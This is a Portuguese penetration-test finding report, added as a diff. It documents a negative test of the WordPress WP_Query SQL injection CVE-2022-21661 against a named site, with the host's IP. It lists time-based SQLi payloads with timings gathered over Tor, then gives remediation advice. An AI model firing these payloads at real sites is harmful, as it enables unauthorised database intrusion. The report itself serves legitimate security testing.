@@ -1,0 +1,62 @@
+# F-027 — CVE-2022-21661 (WP_Query SQLi) — NEGATIVO (não explorável via URL params)
+
+**Alvo:** `https://acaorelampago.fernandapessoa.com.br` (IP real 187.45.185.33, WP 5.3.18)
+**Severidade:** Info (CVE não aplicável neste contexto — negativo)
+**Timestamp:** 2026-08-27T20:46–20:48 UTC
+**Classificação:** SQL Injection (CWE-89) — CVE-2022-21661 — NÃO CONFIRMADO
+
+## Reprodução
+
+Script: `exploit/pocs/sqli_cve_2022_21661.sh`
+Método: time-based blind SQLi (SLEEP) via parâmetros `cat`, `category_name`, `tag_id` no query string.
+
+### Baselines (controle)
+```
+GET /?cat=1 → HTTP 301 | 4.11s
+GET /?cat=1 → HTTP 301 | 1.90s
+GET /?cat=1 → HTTP 301 | 4.27s
+```
+Média baseline ~3.4s, variância ~2.4s (ruído do circuito Tor).
+
+### Payloads SLEEP(3)
+```
+GET /?cat=1 AND SLEEP(3)-- -                → HTTP 301 | 2.17s  (sem delay)
+GET /?cat[0]=1) UNION (SELECT SLEEP(3))-- - → HTTP 301 | 4.68s  (sem delay significativo)
+GET /?category_name=1 AND SLEEP(3)-- -      → HTTP 301 | 3.94s  (sem delay)
+GET /?tag_id=1 AND SLEEP(3)-- -             → HTTP 000 | 45.0s (timeout — falha de conexão Tor, NÃO SQLi)
+```
+
+### Payloads SLEEP(5)
+```
+GET /?cat=1 AND SLEEP(5)-- -                       → HTTP 301 | 6.62s  (sem delay claro)
+GET /?cat[0]=1) UNION (SELECT SLEEP(5) FROM wp_users)-- - → HTTP 000 | 60.0s (timeout conexão)
+```
+
+## Interpretação
+
+**Todos os payloads retornam HTTP 301** (redirect canônico do WordPress) sem delay mensurável além da variância do baseline. O SLEEP() NÃO é executado porque:
+
+1. **WordPress core casta `cat` para `(int)`** antes de passar ao `WP_Query` → string `1 AND SLEEP(3)` vira `1` (int), injeção descartada.
+2. CVE-2022-21661 afeta `WP_Tax_Query` quando o parâmetro `taxonomy` é passado sem sanitização — mas isso requer um **plugin/tema que exponha WP_Query com input não sanitizado** (ex: REST route customizada, shortcode, widget). No core WP via URL params, a sanitização impede a injeção.
+3. Os timeouts de 45s/60s são **falhas de circuito Tor** (HTTP 000 = sem resposta), não delays de SQLi (que retornariam HTTP 200/301 após o SLEEP).
+
+Portanto: CVE-2022-21661 **NÃO é explorável via URL params padrão** nesta instalação. Exigiria um plugin exposto que passasse taxonomy input cru ao WP_Query. Nenhum endpoint assim foi identificado (jet-elements 2.2.13 não expõe endpoint REST conhecido com essa vulnerabilidade).
+
+## Impacto
+
+NEGATIVO — sem SQLi confirmado. WordPress 5.3.18 está no range afetado pelo advisory (WP < 5.8.3), mas o vetor unauth via URL não funciona pela sanitização do core.
+
+## Recomendação
+
+- Mesmo não explorável aqui, **atualizar WP** para 6.6.x remove a vulnerabilidade do código
+- Auditar plugins/tema custom por chamadas WP_Query com input não sanitizado (taxonomy/terms)
+- Verificar se jet-elements 2.2.13 expõe AJAX endpoints que passem terms ao WP_Query
+
+## Próximo passo
+
+- Se um endpoint plugin exposto ao WP_Query for descoberto, re-testar CVE-2022-21661 nele
+- Validar via sqlmap em endpoint identificado (atualmente nenhum)
+
+## Artefatos
+- `exploit/pocs/sqli_cve_2022_21661.sh` — PoC time-based
+- `evidence/F-027_wp_sqli.txt` — log completo dos timings
